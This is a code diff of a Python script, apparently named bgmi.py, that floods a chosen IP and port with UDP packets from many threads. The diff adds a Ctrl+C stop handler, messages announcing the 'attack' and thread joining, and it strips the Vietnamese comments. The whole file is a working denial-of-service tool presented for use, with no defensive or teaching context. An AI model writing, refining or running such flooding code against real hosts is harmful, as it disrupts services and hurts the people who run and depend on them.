@@ -2,8 +2,8 @@
 import sys
 import socket
 import threading
+import signal
 
-# Kiểm tra số tham số
 if len(sys.argv) < 5:
     print("Usage: ./bgmi.py <IP> <PORT> <PACKET_SIZE> <NUM_THREADS>")
     sys.exit(1)
@@ -13,26 +13,34 @@ PORT = int(sys.argv[2])
 PACKET_SIZE = int(sys.argv[3])
 NUM_THREADS = int(sys.argv[4])
 
+stop_flag = False
 data = bytearray(PACKET_SIZE)
+
+def signal_handler(sig, frame):
+    global stop_flag
+    stop_flag = True
+    print("\n[+] Stopping attack...")
+
+signal.signal(signal.SIGINT, signal_handler)
 
 def spam():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while True:  # Vòng lặp vô hạn
+    while not stop_flag:
         try:
             sock.sendto(data, (IP, PORT))
         except:
-            pass  # bỏ qua lỗi để spam liên tục
+            pass
 
 threads = []
 for _ in range(NUM_THREADS):
     t = threading.Thread(target=spam)
-    t.daemon = True  # thread chạy ngầm
+    t.daemon = True
     t.start()
     threads.append(t)
 
-# Giữ main thread chạy để các thread spam tiếp tục
-try:
-    while True:
-        pass
-except KeyboardInterrupt:
-    print("\nStopped by user")
+print(f"[+] Attacking {IP}:{PORT} with {NUM_THREADS} threads, {PACKET_SIZE} bytes per packet. Ctrl+C to stop.")
+
+for t in threads:
+    t.join()
+
+print("[+] Attack stopped.")
